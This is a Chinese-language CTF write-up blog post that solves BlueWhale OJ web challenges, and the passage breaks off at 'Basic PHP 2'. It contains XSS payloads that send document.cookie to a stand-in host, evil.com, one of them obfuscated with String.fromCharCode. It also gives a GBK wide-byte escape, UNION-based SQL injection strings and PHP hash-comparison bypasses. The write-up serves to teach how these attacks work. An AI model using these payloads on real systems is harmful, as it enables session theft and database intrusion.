<!DOCTYPE html>
<html lang="en">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including &quot;Welcome to web&quot;, &quot;Calculator&quot;, &quot;RapidTyping&quot;, &quot;XSS1&quot;, &quot;XSS 2&quot;, &quot;Basic SQL&quot;, &quot;Basic PHP&quot;, &quot;Basic PHP 2&quot;, &quot;BabyXSS&quot;, &quot;BasicFileInclude&quot;, &quot;Fxx">
<meta property="og:type" content="article">
<meta property="og:title" content="BlueWhale OJ Web WriteUp Part 1">
<meta property="og:url" content="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/index.html">
<meta property="og:site_name" content="Shadow Gallery">
<meta property="og:description" content="BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including &quot;Welcome to web&quot;, &quot;Calculator&quot;, &quot;RapidTyping&quot;, &quot;XSS1&quot;, &quot;XSS 2&quot;, &quot;Basic SQL&quot;, &quot;Basic PHP&quot;, &quot;Basic PHP 2&quot;, &quot;BabyXSS&quot;, &quot;BasicFileInclude&quot;, &quot;Fxx">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-08-05T09:22:10.000Z">
<meta property="article:modified_time" content="2020-08-11T08:51:02.875Z">
<meta property="article:author" content="Srpopty">
<meta property="article:tag" content="BlueWhale">
<meta property="article:tag" content="WriteUp">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>BlueWhale OJ Web WriteUp Part 1 | Shadow Gallery</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Shadow Gallery</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Live in the shadow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Srpopty">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shadow Gallery">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BlueWhale OJ Web WriteUp Part 1
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-08-05 17:22:10" itemprop="dateCreated datePublished" datetime="2020-08-05T17:22:10+08:00">2020-08-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-11 16:51:02" itemprop="dateModified" datetime="2020-08-11T16:51:02+08:00">2020-08-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <div class="post-description">BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including "Welcome to web", "Calculator", "RapidTyping", "XSS1", "XSS 2", "Basic SQL", "Basic PHP", "Basic PHP 2", "BabyXSS", "BasicFileInclude", "FxxkingBackdoor", "Global Page", "BabyCrack", "Baby Reverse", "Confused question", "ZipCracker".</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Welcome-to-web-5"><a href="#Welcome-to-web-5" class="headerlink" title="Welcome to web(5)"></a>Welcome to web(5)</h1><p>Web签到题，进入php0给一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;key&#x27;</span>] == <span class="string">&#x27;areyousure&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;For this exercise, flag is: ******&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交GET参数key，值为areyousure，就可以得到flag<br><code>flag&#123;We1C0me_to_W3b&#125;</code></p>
<hr>
<h1 id="Calculator-25"><a href="#Calculator-25" class="headerlink" title="Calculator(25)"></a>Calculator(25)</h1><p>给了一道简单的计算题，但是数字很大，要在1.5秒内算出来，手算根本不可能，这时候就需要借助脚本的帮助。<br>后端的逻辑是用户第一次访问的时候给一道计算题，这时候生成一个session，服务器凭借这个session来判断用户时候已经领取过一个计算题，如果已经领取过就接受用户的答案。<br>可以用Python在第一次GET获取计算表达式以后保存session，然后再用这个session把答案发过去，可以用正则表达式提取第一次Get获取的网页中的计算表达式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/calculator/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">ret = sess.get(url).content</span><br><span class="line">exp = re.findall(<span class="string">r&#x27;&lt;span id=&quot;exp&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, ret)[<span class="number">0</span>]</span><br><span class="line">ans = str(eval(exp.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="keyword">print</span> exp + ans</span><br><span class="line"><span class="keyword">print</span> sess.get(url + <span class="string">&#x27;?answer=&#x27;</span> + ans).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以用JavaScript直接再网页上操作计算答案然后再自动提交，不过手速要快一点</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;answer&#x27;</span>)[<span class="number">0</span>].value=<span class="built_in">eval</span>(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;exp&#x27;</span>).innerText.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].submit();</span><br></pre></td></tr></table></figure>

<p>答案正确并且在1.5秒内提交即可获取flag<br><code>flag&#123;yes_you_are_calculat0r&#125;</code></p>
<hr>
<h1 id="RapidTyping-50"><a href="#RapidTyping-50" class="headerlink" title="RapidTyping(50)"></a>RapidTyping(50)</h1><p>和Calculater差不多的套路，给一个很长的图片验证码，要求在2.5秒内输入，手工输入肯定是不可能的，查看网页源码可以发现验证码图片使用的是svg+xml，那么就代表所有的验证码都是直接用svg绘制的，并且验证码的字符就在网页上，svg的绘制内容采用base64编码，解码出以后再用正则表达式获取所有的验证码，需要注意的就是验证码是由顺序的，这个顺序要按照x的坐标顺序排列。</p>
<p>和Calculater一样，先Get获取验证码以后解出验证码在用同一个session发过去，可以用正则表达式提取svg的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/captcha/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">svg = base64.b64decode(</span><br><span class="line">    re.findall(<span class="string">r&#x27;&lt;img src=&quot;data:image/svg\+xml;base64,(.*?)&quot; /&gt;&#x27;</span>,</span><br><span class="line">               sess.get(url).content)[<span class="number">0</span>]</span><br><span class="line">)</span><br><span class="line">captchas = &#123;</span><br><span class="line">    int(item[<span class="number">0</span>]): item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> re.findall(</span><br><span class="line">        <span class="string">r&#x27;&lt;text x=&quot;(\d+)&quot; y=&quot;\d+&quot; style=&quot;fill: rgb\(\d+, \d+, \d+\);&quot;&gt;(\w)&lt;/text&gt;&#x27;</span>, svg</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>.join([captchas[x] <span class="keyword">for</span> x <span class="keyword">in</span> sorted(captchas.keys())])</span><br><span class="line"><span class="keyword">print</span> sess.get(url + <span class="string">&#x27;?code=&#x27;</span>+captcha).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以用Javascript，不过手速要快一点</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">svg = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">svg.innerHTML = atob(<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;img&#x27;</span>)[<span class="number">0</span>].src.substr(<span class="number">26</span>));</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">text = <span class="built_in">Array</span>.from(svg.getElementsByTagName(<span class="string">&#x27;svg&#x27;</span>)[<span class="number">0</span>].getElementsByTagName(<span class="string">&#x27;text&#x27;</span>)).sort(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">parseInt</span>(a.getAttribute(<span class="string">&#x27;x&#x27;</span>))-<span class="built_in">parseInt</span>(b.getAttribute(<span class="string">&#x27;x&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    ).forEach(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        captcha += item.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;code&#x27;</span>)[<span class="number">0</span>].value = captcha;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].submit();</span><br></pre></td></tr></table></figure>

<p>答案正确并且在2.5秒内解出即可获得flag<br><code>flag&#123;svg_C4P7cHa_n0t_$ecUr3&#125;</code></p>
<hr>
<h1 id="XSS1-75"><a href="#XSS1-75" class="headerlink" title="XSS1(75)"></a>XSS1(75)</h1><p>基本的XSS<br>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        $text = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $text = str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>,$text);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;svg&gt;&lt;script&gt;var a=\&quot;&quot;</span>. $text . <span class="string">&quot;\&quot;&lt;/script&gt;&lt;/svg&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>过滤了双引号，尖括号和换行符，但是可以看到最后输出的位置是在svg的标签里，所以可以利用svg标签可以解析HTMl实体的特性完成注入。<br>测试payload如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;alert(<span class="number">123</span>);<span class="keyword">var</span> b=&amp;amp;quot;</span><br></pre></td></tr></table></figure>
<p>先用<code>&amp;amp;quot;</code>闭合前面的双引号再加上<code>;</code>结束语句，后面就可以执行任意javascript代码了，最后再用一个<code>&amp;amp;quot;</code>闭合后面的双引号，或者也可以直接注释掉后面的双引号。</p>
<p>题目要求是拿到管理员的cookie，payload如下，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;img=<span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);img.src=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].appendChild(img);<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>记得在输入的时候用url编码一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26quot%3B%3Bimg%3Ddocument.createElement%28%27img%27%29%3Bimg.src%3D%27http%3A%2F%2Fevil.com%2Fxss%2F%3Fcookie%3D%27%2Bescape%28document.cookie%29%3Bdocument.getElementsByTagName%28%27form%27%29%5B0%5D.appendChild%28img%29%3B%2F%2F</span><br></pre></td></tr></table></figure>

<p>最后从cookie里获取flag<br><code>flag&#123;Br0wseR_F3atUre&#125;</code></p>
<hr>
<h1 id="XSS-2-75"><a href="#XSS-2-75" class="headerlink" title="XSS 2(75)"></a>XSS 2(75)</h1><p>这次没有直接给源码，输出的引号前面会被加上反斜杠转义，但是查看网页源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;GBK&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;autofocus&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到输出的网页上采用了GBK编码，可以用宽字节注入<br>测试payload为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%<span class="number">22</span>;alert(<span class="number">1</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>在双字节编码中，前面的%fa加上反斜杠可以构成汉字“鶿”的编码，这样后面的双引号%22就可以成功逃逸，其他的引号可以使用<code>String.fromCharCode</code>绕过。</p>
<p>窃取cookie的payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%22;img&#x3D;document.createElement(String.fromCharCode(105,109,103));img.src&#x3D;String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,120,115,115,47,63,99,111,111,107,105,101,45)%2bescape%28document.cookie%29;document.getElementsByTagName(String.fromCharCode(98,111,100,121))[0].appendChild(img);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>最后获得flag为<br><code>flag&#123;GbK_is_3V1L&#125;</code></p>
<hr>
<h1 id="Basic-SQL-75"><a href="#Basic-SQL-75" class="headerlink" title="Basic SQL(75)"></a>Basic SQL(75)</h1><p>最基础的SQL注入，可以用SQLmap直接扫或者手工注入<br>首选用payload<code>&#39; or &#39;1&#39;=&#39;1</code>发现可以获取所有新闻，推测查询语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">search</span> <span class="keyword">like</span> <span class="string">&#x27;&#123;$_POST[&quot;search&quot;]&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>获取查询出的列数<br><code>a&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3</code></p>
<p>获取所有数据库<br><code>a&#39; union select &#39;1&#39;,(select group_concat(SCHEMA_NAME) from information_schema.schemata),&#39;3</code></p>
<p>获取当前数据库名<br><code>a&#39; union select &#39;1&#39;,database(),&#39;3</code></p>
<p>获取当前数据库的所有表名<br><code>a&#39; union select &#39;1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;3</code></p>
<p>获取字段名<br><code>a&#39; union select &#39;1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;f1agfl4gher3&#39;),&#39;3</code></p>
<p>获取flag<br><code>a&#39; union select &#39;1&#39;,(select h3r31sfl4g from f1agfl4gher3),&#39;3</code></p>
<p>最后得到flag为<br><code>flag&#123;sql_information_schema_hack&#125;</code></p>
<hr>
<h1 id="Basic-PHP-75"><a href="#Basic-PHP-75" class="headerlink" title="Basic PHP(75)"></a>Basic PHP(75)</h1><p>直接给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// ========== Stage 1 ========== </span></span><br><span class="line">    $test=$_GET[<span class="string">&#x27;test&#x27;</span>]; </span><br><span class="line">    $test=md5($test); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($test==<span class="string">&#x27;0&#x27;</span>) &#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 1.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Game over at stage 1.&quot;</span>; </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========== Stage 2 ========== </span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;name&#x27;</span>] == $_GET[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your name.&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;name&#x27;</span>]) === sha1($_GET[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 2.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Flag: &#x27;</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>看源码一共有两关，第一关需要</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($_GET[<span class="string">&#x27;test&#x27;</span>]) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>这里用的是弱等于，所以只需要找到一个md5是0e开的字符串就行，例如<code>QNKCDZO</code>，在弱等于时0e开头的字符串将会识别为科学计数法。</p>
<p>第二关需要</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">&#x27;name&#x27;</span>] != $_GET[<span class="string">&#x27;password&#x27;</span>] &amp;&amp; sha1($_GET[<span class="string">&#x27;name&#x27;</span>]) === sha1($_GET[<span class="string">&#x27;password&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这里需要name和password不相等，但是他们的sha1要相等，并且还是强等于，由于sha1函数无法处理数组，所以当name和password同是数组时sha1函数将返回false，并且name和password是一个不相等的数组。<br>payload为<br><code>/?test=QNKCDZO&amp;name[]=a&amp;password[]=b</code></p>
<p>最后获得flag为<br><code>flag&#123;=_=PHP_1S_TH3_BES7_L4NGUAGE&#125;</code></p>
<hr>
<h1 id="Basic-PHP-2-75"><a href="#Basic-PHP-2-75" class="headerlink" title="Basic PHP 2(75)"></a>Basic PHP 2(75)</h1><p>直接给了源码</p>
